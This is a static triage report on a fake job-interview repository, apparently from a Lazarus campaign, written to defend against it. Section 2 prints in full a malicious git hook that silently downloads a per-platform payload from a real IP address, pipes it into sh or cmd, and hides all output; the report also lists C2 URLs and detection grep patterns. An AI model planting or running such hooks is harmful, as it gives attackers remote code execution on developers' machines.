# Comprehensive Static Triage Report — `Fullstack.zip` sample

**Date:** 2026-07-15 · **Method:** static, read-only. Sample never executed; C2 never contacted.
**Target:** `~/scam-eval/extracted/` (extraction of `Fullstack.zip`, SHA-256 `4bec2b84…285e`, 62,508 bytes).

## Verdict
🔴 **MALICIOUS** — DPRK/Lazarus "Contagious Interview" fake take-home. The only malicious code is two
weaponized git hooks; the app and PDF are decoys.

---

## ‼️ Read this first — methodology caveat (why several report files are EMPTY)
Empty output here does **NOT** mean "clean." The scan hit a structural blind spot:

- **The working tree contains only ONE file** — `Fullstack_Home_Task.pdf`. All 24 application source files
  exist **only as 42 compressed git objects** under `.git/objects/`, which plaintext `grep` cannot read.
- Therefore `report/urls.txt`, `exec-patterns.txt`, `package-json.txt`, `payload-hosts.txt`,
  `long-line-files.txt`, `dev-paths.txt`, `lockfiles.txt` are all **0 bytes** — the greps had almost nothing
  on disk to search.
- `report/git-identity.txt` came back empty because the script looked at `extracted/.git`, but the repo is
  at **`extracted/Fullstack/.git`** (one level down).
- The malicious hooks are plaintext in `.git/hooks/`, but the `exec-patterns` regex didn't include
  `curl`/`wget`/`| sh`, so it missed them.

**Corrected passes** (right path + object extraction + hook grep) are included below and saved to
`report/git-identity.txt`, `report/malicious-hooks.txt`, `report/urls-in-hooks.txt`,
`report/source-markers.txt`.

---

## 1. Dataset captured
- **72 files** hashed (`report/file-hashes.txt`); 53,987 bytes on disk (working tree + `.git`).
- **Non-text files** (`report/binaries.txt`): the PDF, `.git/index`, and 42 zlib-compressed git objects.
- **Working-tree files (non-.git):** `Fullstack/Fullstack_Home_Task.pdf` only.
- **Hidden files** (`report/hidden-files.txt`, 120 lines): all `.git` internals. **Non-sample hooks: exactly
  two — `post-checkout`, `pre-commit`.** No `.env`, no `.vscode/`.

### Key hashes
| File | SHA-256 |
| --- | --- |
| `Fullstack_Home_Task.pdf` | `ed517a74a9efc7a79ed4889b7c7ce36829824704fcf672bb915d0e934f589c2d` |
| `.git/hooks/post-checkout` | `f126186fe14d02e0d07f14d1ad3b0653abaaae9e099223dbae7513796452054f` |
| `.git/hooks/pre-commit` | `f126186fe14d02e0d07f14d1ad3b0653abaaae9e099223dbae7513796452054f` |
| `Fullstack.zip` (container) | `4bec2b8443bd1600a2239cdb4d77fc9e252785fa144b00f81dd3a25e73ec285e` |

The two hooks are **byte-identical** (same hash).

---

## 2. The malicious code — git hooks (`report/malicious-hooks.txt`)
`post-checkout` and `pre-commit`, identical, 500 bytes:

```sh
#!/bin/sh
# Custom curl command for pre-commit hook
case "$OSTYPE" in
  darwin*)  curl -s 'http://216.126.239.166/728/728m' -L | sh  > /dev/null 2>&1 &;;
  linux*)   wget -qO- 'http://216.126.239.166/728/728l' -L | sh  > /dev/null 2>&1 &;;
  msys*)    curl -s http://216.126.239.166/728/728w -L | cmd  > /dev/null 2>&1 &;;
  cygwin*)  curl -s http://216.126.239.166/728/728w -L | cmd  > /dev/null 2>&1 &;;
  *)        curl -s 'http://216.126.239.166/728/728m' -L | sh  > /dev/null 2>&1 &;;
esac
```

- **Trigger:** `git checkout <branch>` (fires `post-checkout`) or `git commit` (fires `pre-commit`) — exactly
  the steps the PDF instructs.
- **Action:** OS-fingerprint → silently download a per-platform second stage from the C2 → pipe into
  `sh`/`cmd` (execute in memory) → suppress all output (`>/dev/null 2>&1`) → background (`&`).
- **Exec-bit caveat:** hooks are mode `644` and `core.filemode=false`, so *as extracted* they may not fire
  (likely a zip artifact). Treat as live — a different unzip/`chmod` restores execution.

### URLs found inside hooks (`report/urls-in-hooks.txt`)
- `http://216.126.239.166/728/728m` (macOS)
- `http://216.126.239.166/728/728l` (Linux)
- `http://216.126.239.166/728/728w` (Windows)
- `https://facebook.github.io/watchman/` — benign (from `fsmonitor-watchman.sample`)

---

## 3. Actor identity (`report/git-identity.txt`, corrected path)
```
[user] email = wondev.mum@gmail.com   name = wondev_mum
17053fc  add Fullstack_Home_Task.pdf to main branch   2026-07-14 12:22:06 -0400
ba2b9eb  add files to scratch branch                  2026-07-14 12:23:22 -0400
0ec7790  add files to boiler-plate branch             2026-07-14 12:24:22 -0400
```
Single identity **`wondev_mum <wondev.mum@gmail.com>`**; 3 commits in **~2 minutes** — throwaway kit, no real
history.

---

## 4. Application source (extracted from git objects) — CLEAN (`report/source-markers.txt`)
Scanning every tracked blob across `main`/`scratch`/`boiler-plate` for
`atob`/`new Function`/`eval`/`child_process`/`exec`/`spawn`/`curl`/`wget`/`| sh`/`process.env`/URLs yielded
**only benign hits**: `http://localhost:4000` / `:5173` and `process.env.PORT || 4000`. No lifecycle
scripts (`client`/`server package.json` → `dev/build/preview/start` only), no obfuscation, no exfil. The
"Wallet Watchlist" React+Express app is a genuine, half-finished **decoy**.

---

## 5. Report-file index (what each artifact shows)
| File | Result | Interpretation |
| --- | --- | --- |
| `file-hashes.txt` | 72 hashes | For VirusTotal / evidence |
| `file-sizes.txt` | sizes | Largest real file is the PDF (3,451 B) |
| `binaries.txt` | PDF + 42 objects | Non-text = compressed git blobs (expected) |
| `hidden-files.txt` | 120 lines | **2 non-sample hooks = the malware**; no `.env`/`.vscode` |
| `git-identity.txt` | *(corrected)* | Actor `wondev_mum`, 3 rapid commits |
| `malicious-hooks.txt` | hook source | The payload dropper |
| `urls-in-hooks.txt` | 3 C2 URLs | Primary IOCs |
| `source-markers.txt` | localhost only | Decoy app is clean |
| `package-json.txt`, `urls.txt`, `exec-patterns.txt`, `payload-hosts.txt`, `lockfiles.txt`, `long-line-files.txt`, `dev-paths.txt` | **empty** | Blind spot: source is in git objects, not on disk (see caveat) |

---

## 6. IOCs
- **C2:** `216.126.239.166` (HTTP) — paths `/728/728m`, `/728/728l`, `/728/728w`
- **Hook SHA-256:** `f126186f…2054f` · **Container SHA-256:** `4bec2b84…285e`
- **Actor:** `wondev_mum` / `wondev.mum@gmail.com`
- **Files:** `.git/hooks/post-checkout`, `.git/hooks/pre-commit`

## 7. Attribution
DPRK/Lazarus **"Contagious Interview" / TaskJacker** — git-hook loader variant delivering
BeaverTail/InvisibleFerret. Matches: `pre-commit`+`post-checkout` abuse, `$OSTYPE` fingerprint, `curl|sh`
staging, `/dev/null` silencing, cross-platform payloads, crypto-dev targeting.

## 8. Recommendations
- Submit `Fullstack.zip` (`4bec2b84…`) and the C2 IP to VirusTotal; block `216.126.239.166` on DNS/proxy/EDR.
- Never run git `checkout`/`commit`/`pull` inside the sample; read via `git show`/`ls-tree` only.
- To neutralize the local copy: delete `post-checkout` + `pre-commit` (or the whole folder).
- **Fix the runbook grep:** it must (a) read the correct `.git` path, (b) extract git objects
  (`git show`) before grepping source, and (c) include `.git/hooks/` + `curl|wget|\| ?sh` patterns —
  otherwise a repo-delivered sample reads as false-clean.
